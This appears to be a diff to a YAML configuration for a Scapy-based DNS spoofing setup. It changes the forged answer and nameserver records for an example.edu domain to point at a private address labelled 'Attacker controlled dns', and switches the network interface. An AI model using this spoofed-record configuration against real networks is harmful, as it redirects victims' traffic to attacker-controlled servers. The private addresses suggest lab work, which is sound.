@@ -22,7 +22,7 @@ send: # https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html?highlight
                     rrname: "xxxxx.example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
                     type: "A"
                     rclass: "IN"
-                    rdata: "192.168.15.5" # Attacker controlled dns
+                    rdata: "172.22.0.5" # Attacker controlled dns
                   ns:
                     rrname: "example.edu" # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html#scapy.layers.dns.DNSRR
                     type: "NS" # NS
@@ -34,5 +34,5 @@ send: # https://scapy.readthedocs.io/en/latest/api/scapy.sendrecv.html?highlight
                     type: "A"
                     rclass: "IN"
                     ttl: 86400
-                    rdata: "192.168.15.5" # Attacker controlled dns
-    iface: "ens33"
+                    rdata: "172.22.0.5" # Attacker controlled dns
+    iface: "eth0"
